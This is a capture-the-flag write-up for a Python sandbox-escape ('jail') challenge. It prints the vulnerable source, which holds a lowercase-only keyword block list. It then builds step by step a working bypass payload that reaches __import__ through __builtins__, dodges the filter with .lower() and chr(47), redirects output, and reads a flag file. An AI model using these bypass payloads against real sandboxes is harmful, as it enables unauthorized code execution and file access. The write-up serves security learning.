---
title: "Escape Room [Code Audit]"
categories: Acs2023
permalink: /ctfs/acs2023/escaperoom
---
Python Jail challenge for bypassing condition checks and performing code execution.

## 📁 Challenge Description

> Can you escape?
>
> Connect to instance: `nc 192.168.0.45 50137`

```python
import os, sys

def main():
  filter_list = ['sys','import','flag','open','/',"sh","bin",'eval','exec','os','read','system']

  print("Please Input your Source code > ")
  user_data = ''
  while True:
    temp = input()
    if(temp == 'EOF'):
      break

    user_data += temp + '\n'

  print(user_data)
  for filter_str in filter_list:
    if filter_str in user_data:
      print("No hack plz!")
      exit(0)

  binary = compile(user_data, '<string>', 'exec')
  
  os.close(0)
  os.close(1)
  exec(binary)

if __name__ == '__main__':
  
  main()
```

## 🚩 Solution

The program accepts multi-line inputs until it detects the word `'EOF'` at the end of the input. The flag is placed somewhere in the instance. So, we need to figure out how to bypass the condition checks and successfully execute our commands.

Looking through the code, the program seems like filtered out some significant words including `sys`, `import`, `flag`, `open`, `eval`, `exec`, `os`, `read`, `system`, `bin`, `sh`, even the word `flag` and `/`.

We know we need to use these words to help us retrieve the flag. 

During the competition, I found an amazing [write-up](https://anee.me/escaping-python-jails-849c65cf306e) that is very similar to this challenge. Python has a `__builtins__` module that can directly access the pre-defined functions using `__dict__` representation.

Example:

```python
>>> import os.system
>>> __builtins__.__dict__['__import__']('os').__dict__['system']('')
```

These two lines have the same meaning. Of course, we are not going to directly insert the filtered words as they get rejected based on the list.

Luckily, there is a flaw in the `filter_list` where it only checks for the lowercase of the words. Therefore, we can capitalize all the words and add `.lower()` to bypass the check.

```python
>>> __builtins__.dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('')
```

Ok, now here is a problem. The program has another line that prevents returning any outputs to the user. Here is the line,

```python
os.close(0)
os.close(1)
exec(binary)
```

The `os.close()` accepts **File Descriptors** as a parameter. By default, file descriptor `0` refers to standard input, `1` refers to standard output, and `2` refers to standard error. By knowing this, we know that the program is currently using the standard output as it is trying to close this file descriptor before the commands are executed. So, when we attempt to print any output, it will return

```
$ nc 192.168.0.45 50137
Please Input your Source code > 
print('anything')
EOF

Exception ignored in: <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>
OSError: [Errno 9] Bad file descriptor
```

What should we do next? The program does close the standard output but it returns an error. Remember that `2` is the file descriptor for standard error which the program does not include it. Hence, I ended up with a crazy move that I can redirect my standard error to standard output.

```python
>>> __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
```

Now, the standard error is my standard output, which means any output I want to print should replace the error field. By defining this line, the `print()` function will work successfully.

```
$ nc 192.168.0.45 50137
Please Input your Source code >
__builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
print('anything')
EOF

anything
```

Combine what we have now and we can make our payload.

```
__builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47))
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47)+'ctf_user'+chr(47)))

['ctf_user']
['.bashrc', '.bash_logout', '.profile', 'flag', 'main.py']
```

As the program checks `/`, we replace it with `chr(47)` which gives the same meaning. The `os.listdir()` is also used to list the current directory by providing an absolute path and we found a `ctf_user` directory.

Getting deeper, we found the `flag` file. We used the same `.lower()` method to bypass that. However, the program filters the word `read` where `__builtins__` does not include it. Hence, we use a `for` loop to print every character out without abusing the condition checks. From here, we got the flag.

Final payload:

```
$ nc 192.168.0.45 50137
Please Input your Source code >
__builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower())
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47))
print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['listdir'](chr(47)+'home'+chr(47)+'ctf_user'+chr(47)))
f = __builtins__.__dict__['OPEN'.lower()](chr(47)+'home'+chr(47)+'ctf_user'+chr(47)+'FLAG'.lower(), 'r')
for i in f:
        print(i)
EOF

['ctf_user']
['.bashrc', '.bash_logout', '.profile', 'flag', 'main.py']
ACS{r00m_nam3_i4_sandbox__and__y0u_escap3_r00m_successfully!!!}
```

Hope you enjoyed it!
